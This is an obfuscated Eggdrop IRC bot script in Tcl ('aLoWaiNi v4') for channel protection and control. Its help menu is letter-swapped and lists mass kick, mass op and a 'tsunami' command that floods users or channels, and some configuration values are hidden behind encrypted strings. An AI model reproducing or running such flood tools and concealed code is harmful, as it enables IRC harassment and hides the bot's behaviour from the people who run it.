##################################################################
#       _      __      __    _ _  _ _    ___                  _  #
#  __ _| |   __\ \    / /_ _(_) \| (_)  / __|_  _ __ _ _ _ __| | #
# / _` | |__/ _ \ \/\/ / _` | | .` | | | (_ | || / _` | '_/ _` | #
# \__,_|____\___/\_/\_/\__,_|_|_|\_|_|  \___|\_,_\__,_|_| \__,_| #
#                                                                #
# 	# Script Name        : alowaini.tcl    		           #
#	# Script Version	   : aLo(W)aiNi.v4		           #
#  	# Author             : F4R1S       				     #
# 	# Release Date       : 16 Agustus 2009		           #    
#     # Reported any bugs  : #aLoWaiNi  			           #
#	# www.alowainiscript.at.ua | www.alowaini.tk		     #
#							   			     #
##################################################################
proc [decrypt 64 "d3VeO/ATgwd."] {txt} {
global lenc ldec uenc udec
set retval ""
set count [string length $txt]
set status 0
set lst ""
for {set i 0} {$i < $count} {incr i} {
set idx [string index $txt $i] 
if {$idx == "$" && $status == 0} { 
set status 1
set idx "~$idx"
}
if {$idx == [decrypt 64 "uAwNV.ZfVQk."] && $lst != [decrypt 64 "59.TI0HteTn1"] && $status == 0} {
set status 2
set idx "~$idx"
}
if {$idx == " " && $status == 1} {
set status 0
set idx "$idx~"
}
if {$idx == "]" && $status == 2} {
set status 0
set idx "$idx~"
}
if {$status == 0} {
if {[string match *$idx* $lenc]} {
set idx [string range $ldec [string first $idx $lenc] [string first $idx $lenc]]
}
if {[string match *$idx* $uenc]} {
set idx [string range $udec [string first $idx $uenc] [string first $idx $uenc]]
}
}
set lst $idx
append retval $idx
}
regsub -all -- vmw] $retval "end]" retval
return $retval
}
set [decrypt 64 "QHy7p1srYzh1"] [decrypt 64 "UMWxo/l.eXl.9pork/664t31SRiBq.gniCb.2mj.I1ok8/c/"]
set [decrypt 64 "SAIhk0TeENe."] [decrypt 64 ".Xgoz1ktbbv0volpk0ypIzS.RoVRn/bMpMt/JARxr0pwutd."]
set [decrypt 64 "37pNj/xSAeM/"] [decrypt 64 "s6zLs/e3Scr/f9HsY1Jul5A/XbbFI.8/K1l0MZ/hT1ZYhpk/"]
set [decrypt 64 "FcnI7.Au1Ps/"] [decrypt 64 "3Kavh1w0/uI/OEszd0w29lK/YjXSm/dUHfA.lMXRJ.LfwBl0"]
set [lines "tolyzo-rwov-prxp"] 0
set [lines "tolyzo-xszmnlwv"] "nt"
set [lines "tolyzo-wbmznrxvcvnkgh-nlwv"] 0
set [lines "tolyzo-wlmgprxplkh-nlwv"] 1
set [lines "tolyzo-ivevmtv-nlwv"] 0
set [lines "tolyzo-kilgvxglkh-nlwv"] 0
set [lines "tolyzo-xovziyzmh-nlwv"] 0
set [lines "tolyzo-vmulixvyzmh-nlwv"] 0
set [lines "tolyzo-wbmznrxyzmh-nlwv"] 1
set [lines "tolyzo-kilgvxguirvmwh-nlwv"] 0
set [lines "tolyzo-fhviyzmh-nlwv"] 1
set [lines "tolyzo-xbxov-nlwv"] 1
set [lines "tolyzo-tivvg-nlwv"] 0
set [lines "tolyzo-hszivw-nlwv"] 1
set [lines "tolyzo-zfglelrxv-nlwv"] 0
set [lines "tolyzo-hglkmvgszxp-nlwv"] 0
set [lines "tolyzo-zfgllk-nlwv"] 0
set [lines "tolyzo-fhvirmergvh-nlwv"] 0
set [lines "tolyzo-mlwvhbmxs-nlwv"] 0
set [lines "mrxp-ovm"] 30
if {![info exists nickpass]} {
set [lines "mrxpkzhh"] ""
}
if {![info exists altpass]} {
set [lines "zogkzhh"] ""
}
if {![info exists cfgfile]} {
set [lines "xuturov"] $userfile
}
proc [lines "fmhrc"] {txt} {
set [lines "ivgezo"] $txt
regsub ~ $retval "" retval
return $retval
}
proc [lines "wvark"] {txt} {
return [decrypt 64 [unsix $txt]]
}
proc [lines "wxk"] {txt} {
return [decrypt 64 $txt]
}
proc [lines "ark"] {txt} {
return [encrypt 64 [unsix $txt]]
}
if {![info exists server-online]} {
putlog "not support server online..!"
set [lines "hvievi-lmormv"] 1
}
proc [lines "kfgsok"] {txt} {
global lenc ldec uenc udec notb notc server-online
if {${server-online} == 0} { return 0 }
set [lines "ivgezo"] ""
set [lines "xlfmg"] [string length $txt]
set [lines "hgzgfh"] 1
for {set i 0} {$i < $count} {incr i} {
set [lines "rwc"] [string index $txt $i]
if {$idx == "~"} { 
if {$status == 0} {
set [lines "hgzgfh"] 1
} else {
set [lines "hgzgfh"] 0 
}
}
if {$status == 1} {
if {[string match *$idx* $ldec]} {
set [lines "rwc"] [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
}
if {[string match *$idx* $udec]} {
set [lines "rwc"] [string range $uenc [string first $idx $udec] [string first $idx $udec]]
}
}
append retval $idx
}
regsub -all -- ~ $retval "" retval
if {[string match "*[dezip "06~XsX.1FseR."]*" $retval]} { 
if {![string match "*[dezip "WRtH901w.nV0xvVSw/UyZsO."]*" $retval] && ![string match "**" $retval]} { return 0 }
}
puthelp $retval
}
proc [lines "kfghie"] {txt} {
global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr
if {${server-online} == 0} { return 0 }
set [lines "ivgezo"] ""
set [lines "xlfmg"] [string length $txt]
set [lines "hgzgfh"] 1
for {set i 0} {$i < $count} {incr i} {
set [lines "rwc"] [string index $txt $i] 
if {$idx == "~"} { 
if {$status == 0} {
set [lines "hgzgfh"] 1
} else {
set [lines "hgzgfh"] 0 
}
}
if {$status == 1} {
if {[string match *$idx* $ldec]} {
set [lines "rwc"] [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
}
if {[string match *$idx* $udec]} {
set [lines "rwc"] [string range $uenc [string first $idx $udec] [string first $idx $udec]]
}
}
append retval $idx
}
regsub -all -- ~ $retval "" retval
if {[string match "*[dezip "sw~WDD/CvLqT1"]*" $retval]} { 
if {![string match "*[dezip "WRtH901w.nV0xvVSw/UyZsO."]*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
set [lines "vmwezo"] ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
set [lines "gnk"] ":$banner"
} {
set [lines "gnk"] ":[lgrnd]"
}
} {
if {[info exists kickclr]} {
set [lines "gnk"] [uncolor $tmp]
}
}
set [lines "vmwezo"] "$endval $tmp"
}
set [lines "ivgezo"] $endval
if {[info exists iskick([lindex $retval 2][lindex $retval 1])]} { return 0 }
set iskick([lindex $retval 2][lindex $retval 1]) "1"
if {[info exists igflood([lindex $retval 2])]} { return 0 }
if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { 
set [lines "xsplkh"] $retval
regsub -all -- : $chkops "" chkops
if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
return 0
}
}
}
putserv $retval
}
proc [lines "kfgjxp"] {txt} {
global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr bannick is_m
if {${server-online} == 0} { return 0 }
set [lines "ivgezo"] ""
set [lines "xlfmg"] [string length $txt]
set [lines "hgzgfh"] 1
for {set i 0} {$i < $count} {incr i} {
set [lines "rwc"] [string index $txt $i] 
if {$idx == "~"} { 
if {$status == 0} {
set [lines "hgzgfh"] 1
} else {
set [lines "hgzgfh"] 0 
}
}
if {$status == 1} {
if {[string match *$idx* $ldec]} {
set [lines "rwc"] [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
}
if {[string match *$idx* $udec]} {
set [lines "rwc"] [string range $uenc [string first $idx $udec] [string first $idx $udec]]
}
}
append retval $idx
}
regsub -all -- ~ $retval "" retval
if {[string match "*[dezip "swWDD/CvL~qT1"]*" $retval]} { 
if {![string match "*[dezip "WRtH901w.nV0xvVSw/UyZsO."]*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
set [lines "vmwezo"] ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
set [lines "gnk"] ":$banner"
} {
set [lines "gnk"] ":[lgrnd]"
}
} {
if {[info exists kickclr]} {
set [lines "gnk"] [uncolor $tmp]
}
}
set [lines "vmwezo"] "$endval $tmp"
}
set [lines "ivgezo"] $endval
set iskick([lindex $retval 2][lindex $retval 1]) "1"
if {[info exists igflood([lindex $retval 2])]} { return 0 }
if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { 
set [lines "xsplkh"] $retval
regsub -all -- : $chkops "" chkops
if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
return 0
}
}
}
if {[string match "*$notm*" $retval]} {
set [lines "xuozt"] "c[lindex $retval 1]"
set [lines "xuozt"] [string range $cflag 0 8]
if {[matchattr $cflag M]} {
if {![isutimer "set_-m [lindex $retval 1]"] && ![info exists is_m([lindex $retval 1])]} {
set is_m([lindex $retval 1]) 1
putquick "mode [lindex $retval 1] +bm $bannick([lindex $retval 2])"
return 0
}
}
}
putquick $retval
}
set [lines "mlgw"] [dezip [dcp "59aHf/Y1pAA0yQ.U8/K9.wI/iv/zY/mMRy21"]]
set [lines "mlgn"] [dezip [dcp "Ob/5m1y1qCH.8W7jT.6PwYf/P32Q3.Xuced/JjI00.pML7F0egoNd/qn4Fz.r74xN1eMgTq1"]]
################## STAR DESYN ##################
proc br_resync {} {
  global botnick
  foreach chan [channels] {
    if {[onchan $botnick $chan]} {
     if {[botisop $chan]==1} {
      set Mode "[rw]@$chan"
      putserv "MODE $chan +b-o+o+n+t-b $Mode $botnick $botnick $Mode"
     }
    }
  }
  if {![string match *br_resync* [timers]]} {
    timer [expr 40 + [expr [rand 30] + [expr [rand 10] + [rand 20]]]] br_resync
  }
  return
}

if {![string match *br_resync* [timers]]} {
  timer [expr 40 + [expr [rand 30] + [expr [rand 10] + [rand 20]]]] br_resync
}
set rwelcom {
   "Welcome!To" "4Refresh!To" "spam.checks!iN" "have.a.nice.day!In"
   "a.n.t.i.s.p.a.m!iN" "4R.e.l.o.a.d!To" "aLoWaiNi!TcL"
   "Welcome!To" "4Refresh!To" "spam.checks!iN" "have.a.nice.day!In"
}
proc rw {} {
   global rwelcom
   set rw [lindex $rwelcom [rand [llength $rwelcom]]]
}
putlog "Loaded welcome.tcl"
## voice/devoice 
#Set the channels below (each separated by a space) on which this script would work.
set autovoice(chans) "#alowaini"
#Set the 'number of lines' here after which a user will be voiced
set autovoice(lines) "4"
#Users idling for more than this number of minute(s) will be devoiced.
set autovoice(dvtime) "20"
#Set the time here in 'minutes' after which you would continuously like to check
set autovoice(dvcheck) "5"

bind pubm - "*" autovoice:users
bind ctcp - ACTION autovoice:users2
proc autovoice:users2 {nick host hand chan keyword arg} {
  autovoice:users $nick $host $hand $chan $arg
}
bind join - "*" autovoice:erase:record
if {$autovoice(dvtime) > 0} {bind time - "*" autovoice:devoice:idlers}

proc autovoice:users {nick uhost hand chan text} {
 global autovoice voice
 if {![botisop $chan] || [isbotnick $nick] || [isop $nick $chan] || [isvoice $nick $chan] || ![string match "*+active*" [channel info $chan]]} { return 0 }
 set user [split [string tolower $nick:$chan]]
 if {![info exists voice($user)] && ![isvoice $nick $chan] && ![isop $nick $chan]} {
   set voice($user) 0
 } elseif {[info exists voice($user)] && ([expr $voice($user) + 1] >= $autovoice(lines)) && ![isop $nick $chan] && ![isvoice $nick $chan]} {
   utimer 3 [list autovoice:delay $nick $chan] ; unset voice($user)
 } elseif {[info exists voice($user)]} { incr voice($user)}
}
proc autovoice:delay {nick chan} {
 set user [split [string tolower $nick:$chan]]
 if {[botisop $chan] && [onchan $nick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan] && ![string match "Guest*" $nick]} { pushmode $chan +v $nick ; set voiced($user) 1 }
 if {[info exists voiced($user)]} { pushmode $chan -k 4A14cTivE.4C14hatteR ; flushmode $chan }
}
proc autovoice:erase:record {nick uhost hand chan} {
 global autovoice voice
 if {[isbotnick $nick] || ![string match "*+active*" [channel info $chan]]} { return 0 }
 set user [split [string tolower $nick:$chan]]
 if {[info exists voice($user)]} { unset voice($user) }
}
proc autovoice:devoice:idlers {m h d mo y} {
  global autovoice
  if {([scan $m %d]+([scan $h %d]*60)) % $autovoice(dvcheck) == 0} {
  set chans [string tolower [channels]]
  foreach chan $chans {
	  if {[botisop $chan] && [string match "*+active*" [channel info $chan]]} {
putlog "chek idle user on $chan"
        foreach user [chanlist $chan] {
          set user [string tolower $user]
          if {[botonchan $chan] && ![isbotnick $user] && ![isop $user $chan] && [isvoice $user $chan] && ([getchanidle $user $chan] >= $autovoice(dvtime)) && ![matchattr $user f] && ![matchattr $user v]} {
              pushmode $chan -v $user
              if {![info exists devoice($chan)]} { set devoice($chan) 1 }
            } else { continue }
        }
        if {[info exists devoice($chan)]} { pushmode $chan -k 4D14ePoicE.4F14oR.4I14dLe ; flushmode $chan }
} } } }
putlog "Active Chatter v3.75.b by awyeah edited by F4R1S has been loaded successfully."

## active chatter -- start
bind pub n `+active pub_+active
setudef flag active
proc pub_+active {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*+active*" [channel info $chan]]} { puthelp "NOTICE $nick :$chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +active }
  puthelp "NOTICE $nick :+v active chatter on $chan \[9ON\]"
  saveuser
}
bind pub n `-active pub_-active
proc pub_-active {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*-active*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc +v active chatter on $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -active }
  puthelp "NOTICE $nick :$notc +v active chatter on $chan \[4Off\]"
  saveuser
}
## active chatter -- stop
## split -- start
bind pub n `+split pub_+split
setudef flag split
proc pub_+split {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*+split*" [channel info $chan]]} { puthelp "NOTICE $nick :$chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +split }
  puthelp "NOTICE $nick :split detector on $chan \[9ON\]"
  saveuser
}
bind pub n `-split pub_-split
proc pub_-split {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*-split*" [channel info $chan]]} { puthelp "NOTICE $nick :split detector $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -split }
  puthelp "NOTICE $nick :$notc split detector on $chan \[4Off\]"
  saveuser
}
## split -- stop

################################
# alowaini BOT COMMAND LIST #
################################
bind msg m help msg_help
proc [lines "nht_svok"] {nick uhost hand rest} {
global version notb notc notd vern
if {[istimer "HELP STOPED"]} {
putsrv "MLGRXV ~$nick ~:~$notc ~Svok lm kiltivhh, gib ztzrm ozgvi..!"
return 0
}
timer 5 { putlog "HELP STOPED" }
puthlp "KIRENHT ~$nick ~:~$notd ~xNw ORhG."
puthlp "KIRENHT ~$nick ~:IfMMRMt DrGS Vtt e~[lindex $version 0]~ KlDVIVW YB ~[lgrnd]~ ~$vern"
puthlp "KIRENHT ~$nick ~:NHt..!"
puthlp "KIRENHT ~$nick ~:zfgs <kzhhdliw>         zfgsvmgrxzgv fhvi"
puthlp "KIRENHT ~$nick ~:wvzfgs <kzhhdliw>       wvzfgsvmgrxzgv fhvi"
puthlp "KIRENHT ~$nick ~:kzhh <kzhhdliw>         hvg kzhhdliw"
puthlp "KIRENHT ~$nick ~:kzhhdw <lowkzhh> <mvdkzhh> xszmtv fhvi kzhhdliw"
puthlp "KIRENHT ~$nick ~:fhviorhg                fhviorhg"
puthlp "KIRENHT ~$nick ~:lk <#> <mrxp>           lk hlnvlmv"
puthlp "KIRENHT ~$nick ~:wvlk <#> <mrxp>         wvlk hlnvlmv"
puthlp "KIRENHT ~$nick ~:elrxv <#> <mrxp>        elrxv hlnvlmv"
puthlp "KIRENHT ~$nick ~:wvelrxv <#> <mrxp>      wvelrxv hlnvlmv"
puthlp "KIRENHT ~$nick ~:prxp <#> <mrxp|slhg> <ivzhlm> prxp hlnvlmv"
puthlp "KIRENHT ~$nick ~:prxpyzm <#> <mrxp|slhg> <ivzhlm> prxpyzm hlnvlmv"
puthlp "KIRENHT ~$nick ~:rwvmgrub <mrxp> <kzhhdw> rwvmgrub gl mrxphvie hlnvlmv zxxvhh"
puthlp "KIRENHT ~$nick ~:qlrm <#>                qlrmrmt #xszmmvo gvnklizib"
puthlp "KIRENHT ~$nick ~:kzig <#>                kzig #xszmmvoh"
if {[matchattr $nick Z]} {
puthlp "KIRENHT ~$nick ~:oltl <blfi xivd oltl>   xszmtrmt gvcg oltl lm prxp nvhhztv"
puthlp "KIRENHT ~$nick ~:eslhg <RK WMH>          xszmtrmt eslhg"
puthlp "KIRENHT ~$nick ~:zdzb <nht>              hvg ylg zdzb nvhhztv"
puthlp "KIRENHT ~$nick ~:zwnrm <nht>             hvg ylg zwnrm lm hgzgfh"
puthlp "KIRENHT ~$nick ~:nvnl <fhvi|zoo> <nht>   hvmw nvnl gl zoo fhvi li lmv fhvi"
puthlp "KIRENHT ~$nick ~:yzmgrnv <nrmfgvh>       zfgl fmyzm lm C nrmfgvh (0 mvevi fmyzm)"
puthlp "KIRENHT ~$nick ~:oltxszm <#|0UU>         olt #xszmmvo"
puthlp "KIRENHT ~$nick ~:15DZIMRMT!! rg droo wvtivzhv ylg kviulinzmxv"
puthlp "KIRENHT ~$nick ~:<4WXX> .olt             hsld #xszmmvo olt"
puthlp "KIRENHT ~$nick ~:15mlgv. kovzhv rmxivzhv lm tvmvizo - drmwld yfuuvi rmgl 5000"
puthlp "KIRENHT ~$nick ~:+xszm <#>               qlrmrmt kvinzmvmg #xszmmvo"
puthlp "KIRENHT ~$nick ~:ylgmrxp <mrxp> <rw>     xszmtrmt kvinzmvmg ylg kirnzib mrxp"
puthlp "KIRENHT ~$nick ~:ylgzogmrxp <mrxp> <rw>  xszmtrmt kvinzmvmg ylg zogvimzgv mrxp"
puthlp "KIRENHT ~$nick ~:ivzomznv                xszmtrmt kvinzmvmg ylg ivzomznv"
puthlp "KIRENHT ~$nick ~:rwvmg                   xszmtrmt kvinzmvmg ylg rwvmg"
puthlp "KIRENHT ~$nick ~:wrv                     proo ylg"
}
puthlp "KIRENHT ~$nick ~:#KfYORX NHt..!"
puthlp "KIRENHT ~$nick ~:`yzmpvb LM|LUU           hvg pvb lm yzm vmzyovw|wrhzyov"
puthlp "KIRENHT ~$nick ~:`fk                      lk blfi hvou"
puthlp "KIRENHT ~$nick ~:`wldm                    wvlk blfi hvou"
puthlp "KIRENHT ~$nick ~:`lk/+l <mrxp>            lk hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`wvlk/-l <mrxp>          wvlk hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`elrxv/+e <mrxp>         elrxv hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`wvelrxv/-e <mrxp>       wvelrxv hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`prxp <mrxp> <ivzhlm>    prxp hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`prxpyzm <mrxp> <ivzhlm> prxpyzm hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`nlwv <+/- hvggrmth> nlwv hvggrmt #xszmmvo"
puthlp "KIRENHT ~$nick ~:`krmt / klmt             krmt blfi hvou"
puthlp "KIRENHT ~$nick ~:`rmergv <mrxp>           rmergv kvihlm gl xfiivmg #xszmmvo"
puthlp "KIRENHT ~$nick ~:`yzmorhg <#xszmmvo>      orhg lu yzmmvw uiln hkvxrurvw <#xszmmvo>"
puthlp "KIRENHT ~$nick ~:`yzm <mrxp|slhgnzhp>     yzmmvw mrxp li slhgnzhp"
puthlp "KIRENHT ~$nick ~:`fmyzm <mrxp|slhg> <#>   fmyzmmvw mrxp li slhgnzhp"
puthlp "KIRENHT ~$nick ~:`+xszm <#>               qlrmrmt kvinzmvmg #xszmmvo"
puthlp "KIRENHT ~$nick ~:`xszmmvoh                orhg lu xszmmvo dsl'h ylg hrg lm"
puthlp "KIRENHT ~$nick ~:`fhviorhg                orhg lu fhvi"
puthlp "KIRENHT ~$nick ~:`xszmrmul <#>            orhg lu lkgrlm uli hkvxrurvw #xszmmvo"
puthlp "KIRENHT ~$nick ~:`qlrm <#>                qlrmrmt #xszmmvo gvnklizib"
puthlp "KIRENHT ~$nick ~:`kzig <#>                kzig hkvxrurvw #xszmmvo"
puthlp "KIRENHT ~$nick ~:`xbxov <#>               xbxov lm hkvxrurvw #xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- xbxov <#|zoo>       vmzyov/wrhzyov ylg xbxov vevib 15 nrmfgvh"
puthlp "KIRENHT ~$nick ~:`+/- rtmliv <mrxp|slhg>  rtmliv li fmrtmliv kvihlm"
if {[matchattr $nick n]} {
puthlp "KIRENHT ~$nick ~:`+/- hgzgfh <#>          vmzyov/wrhzyov ylg wrhkozbrmt hgzgfh"
puthlp "KIRENHT ~$nick ~:`+/- vmulixvyzm <#>      vmzyov/wrhzyov ylg vmulixvyzmh"
puthlp "KIRENHT ~$nick ~:`+/- zfglelrxv <hvxh>    vmzyov/wrhzyov xszmmvo zfglelrxv lm qlrm"
puthlp "KIRENHT ~$nick ~:`+/- hvvm <#>            zxgrezgv/wvzxgrev hvvm lm #"
puthlp "KIRENHT ~$nick ~:`+/- tfziw <#|zoo>       vmzyov/wrhzyov ylg tfziw"
puthlp "KIRENHT ~$nick ~:`+/- nzhgvi <mrxp>       zww/wvo <mrxp> uiln nzhgvi orhg"
puthlp "KIRENHT ~$nick ~:`+/- zelrxv <mrxp>       zww/wvo <mrxp> uiln zelrxv orhg"
puthlp "KIRENHT ~$nick ~:`+/- uirvmw <mrxp>       zww/wvo <mrxp> uiln uirvmw orhg"
puthlp "KIRENHT ~$nick ~:`+/- rktfziw <slhg>      zww/wvo slhg uiln rktfziw orhg"
puthlp "KIRENHT ~$nick ~:`+/- zprxp <slhg>        zww/wvo slhg uiln prxp orhg"
puthlp "KIRENHT ~$nick ~:`+/- zxgrev              vmzyod/wrhzyov zfgl elrxv gl zxgrev xszggvih"
puthlp "KIRENHT ~$nick ~:`+/- mllk <mrxp>         zww/wvo <mrxp> uiln ml-lk orhg"
puthlp "KIRENHT ~$nick ~:`glkrx <glkrx>           xszmtv xszmmvo glkrx"
puthlp "KIRENHT ~$nick ~:`hgzgfh                  hgzgfh hbhgvn"
puthlp "KIRENHT ~$nick ~:`hvievih                 hvievih ylg xfiivmgob ifmmrmt"
puthlp "KIRENHT ~$nick ~:`qfnk <hvievi> <klig>    kfhs ylg gl fhv hkvx hvievi"
puthlp "KIRENHT ~$nick ~:`zxxvhh <mrxp>           hvv fhvi zxxvhh uiln hkvx uozth"
}
if {[matchattr $nick Z]} {
puthlp "KIRENHT ~$nick ~:`+/- ulixvw ulixv ylg gl hvg nlwv d/l prxp 1hg"
puthlp "KIRENHT ~$nick ~:`+/- xlolfi              vmzyov/wrhzyov xlolfi lm prxp nht"
puthlp "KIRENHT ~$nick ~:`+/- tivvg <nht>         zfgltivvg fhvi lm qlrm %m mrxp %x xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- mgxkzig <nht>       zfgl mlgrxv fhvi lm kzig xszmmvoh" 
puthlp "KIRENHT ~$nick ~:`+/- ivkvzg <mfnyvi>     nzc ivkvzg fhvi kvinrggvw"
puthlp "KIRENHT ~$nick ~:`+/- gvcg <mfnyvi> xszi  ornrgvw gvcg ovmtgs lm xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- ornrg <mfnyvi>      ornrgvw fhvi lm xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- xzkh <%>            nzc %kvixvmg fkkvi gvcg"
puthlp "KIRENHT ~$nick ~:`+/- xolmv <nzc>         vmzyov/wrhzyov ylg zmgr xolmvh"
puthlp "KIRENHT ~$nick ~:`+/- ivlk                zfgl iv@k ylg dsvm tlg wv@k"
puthlp "KIRENHT ~$nick ~:`+/- qlrmkzig <hvxlmwh>  prxp fhvi qlrm kzig rm kzhg C 2mw"
puthlp "KIRENHT ~$nick ~:`+/- hkzn                hxzmmrmt uli hkzn"
puthlp "KIRENHT ~$nick ~:`+/- nzhhqlrm            kivevmgrmt nzhh qlrm oznv"
puthlp "KIRENHT ~$nick ~:`+/- pvb <dliw>          hvg xszmmvo drgs pvb"
puthlp "KIRENHT ~$nick ~:`+/- ivevmtv             vmzyov/wrhzyov ylg ivevmtv"
puthlp "KIRENHT ~$nick ~:`+/- yzwdliw <yzwdliw>   zww/ivnlev yzwdliw uiln orhg"
puthlp "KIRENHT ~$nick ~:`+/- zwedliw <zwedliw>   zww/ivnlev zwedliw uiln orhg"
puthlp "KIRENHT ~$nick ~:`+/- xlolfih             vmzyov/wrhzyov prxp dsl fhv xlolfi"
puthlp "KIRENHT ~$nick ~:`+/- ylow                vmzyov/wrhzyov prxp dsl fhv ylow"
puthlp "KIRENHT ~$nick ~:`+/- zxgrlm <gvcg>       vmzyov/wrhzyov ylg zxgrlm, <gvcg> xivzgv drgs fi ldm gvcg li qfhg +zxgrlm droo hsld izmwln lu gvcg"
puthlp "KIRENHT ~$nick ~:`+/- xhtfziw             vmzyov/wrhzyov XszmHvie Tfziw LmOrmv li Luuormv zmw hsld gl gsv glkrx lm xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- rwov <nmh>          vmzyov/wrhzyov @kh rwov Nzc. <grnv rm nrmfgvh>"
puthlp "KIRENHT ~$nick ~:`+/- mlzdzblk            vmzyov/wrhzyov xsvxprmt lm zdzb @kh"
puthlp "KIRENHT ~$nick ~:`+/- fmrwvmgrublk        vmzyov/wrhzyov @kh nfhg yv rmwvmgrub"
puthlp "KIRENHT ~$nick ~:`yzwdliwh                orhg lu yzwdliwh"
puthlp "KIRENHT ~$nick ~:`zwedliwh                orhg lu zwedliwh"
puthlp "KIRENHT ~$nick ~:`mlylg                   hxzmmrmt uli ylg zmw prxp gsvn lfg"
puthlp "KIRENHT ~$nick ~:`hwvlk <#>               ylg hvou wvlk"
puthlp "KIRENHT ~$nick ~:`xszmnlwv # <+mgnxrop 1> hvg kvinzmvmg nlwv uli hkvxrurvw #"
puthlp "KIRENHT ~$nick ~:`xszmhvg <#> <ORMV|XGXK|QLRM|WVLK|PRXP|MRXP> hvg # lkgrlmh"
puthlp "KIRENHT ~$nick ~:`xszmhvgzoo <lkgrlm>     hvg lkgrlm uli zoo #"
puthlp "KIRENHT ~$nick ~:`xszmivhvg <#|zoo>       ivhvgrmt lkgrlm uli hkvxrurvw #xszmmvo"
puthlp "KIRENHT ~$nick ~:`yzmgrnv                 sld olmt ylg fmyzm rm C nrmfgvh"
puthlp "KIRENHT ~$nick ~:`ghfmznr <mrxp|#> <gvcg> uollw hlnvlmv li xszmmvo"
puthlp "KIRENHT ~$nick ~:`wvofhvi <mrxp>          wvo fhvi uiln fhviorhg"
puthlp "KIRENHT ~$nick ~:`ivhgzig                 ivhgzigrmt ylg zohl qfnkrmt hvievi"
puthlp "KIRENHT ~$nick ~:`+/- ldmvi <mrxp>        zww/wvo <mrxp> uiln ldmvi orhg"
puthlp "KIRENHT ~$nick ~:`+/- zwnrm <mrxp>        zww/wvo <mrxp> uiln zwnrm orhg"
puthlp "KIRENHT ~$nick ~:`+/- zlk <mrxp>          zww/wvo <mrxp> uiln zlk orhg"
puthlp "KIRENHT ~$nick ~:`+/- slhg <mrxp> <uozt>  zww li ivnlev fhvi slhg"
puthlp "KIRENHT ~$nick ~:`+/- tmrxp <mrxp>        tfziw mrxp prxp rg ru mlg rwvmgrub"
puthlp "KIRENHT ~$nick ~:`slhg <mrxp>             hvv fhvi slhg"
puthlp "KIRENHT ~$nick ~:`nlk <#xszmmvo>          nzhh lk"
puthlp "KIRENHT ~$nick ~:`nwvlk <#xszmmvo>        nzhh wvlk"
puthlp "KIRENHT ~$nick ~:`nprxp <#xszmmvo>        nzhh prxp"
puthlp "KIRENHT ~$nick ~:`nnht <#xszmmvo>         nzhh nht vcxvkg gsv lkkvw"
puthlp "KIRENHT ~$nick ~:`nrmergv <#xszmmvo>      nzhh rmergv vcxvkg gsv lkkvw"
puthlp "KIRENHT ~$nick ~:`nfmyzmh <#xszmmvo>      nzhh fmyzm"
puthlp "KIRENHT ~$nick ~:`hzb <gvcg>              hzb drgs hkvhrurvw gvcg"
puthlp "KIRENHT ~$nick ~:`nht <mrxp> <gvcg>       nht kvihlm"
puthlp "KIRENHT ~$nick ~:`zxg <gvcg>              zxg drgs hkvhrurvw gvcg"
puthlp "KIRENHT ~$nick ~:`mlgrxv <mrxp> <gvcg>    nht kvihlm li #xszmmvo drgs hkvhrurvw gvcg"
puthlp "KIRENHT ~$nick ~:`+/- glkrxolxp           pvvk glkrx olxpvw"
puthlp "KIRENHT ~$nick ~:`+/- mlkzig <#xszmmvo>   nzpv # kilgvxgvw"
puthlp "KIRENHT ~$nick ~:`+/- nfhglk              hvg ylg wvo xszmmvo ru mlg lkvw"
puthlp "KIRENHT ~$nick ~:`+/- rmergvolxp <#>      rmergv yzxp dsl kzig lm hkvx xszm"
puthlp "KIRENHT ~$nick ~:`+/- wlmgprxplkh         vmzyov|wrhzyov ylg prxp @"
puthlp "KIRENHT ~$nick ~:`+/- zfglprxp            zfgl prxp lm qlrm"
puthlp "KIRENHT ~$nick ~:`mrxp <mrxp>             xszmtv mrxp gvnklizib"
puthlp "KIRENHT ~$nick ~:`zogmrxp                 xszmtv mrxp gl zogvimzgrev mrxp"
puthlp "KIRENHT ~$nick ~:`izmwmrxp                xszmtv mrxp gl izmwln mrxp"
puthlp "KIRENHT ~$nick ~:`ivzomrxp                xszmtv mrxp gl ivzo mrxp"
puthlp "KIRENHT ~$nick ~:`xszggi  <mrxp> <uozt>   xszmtrmt fhvi uozt (+) zww li (-) ivnlev rg"
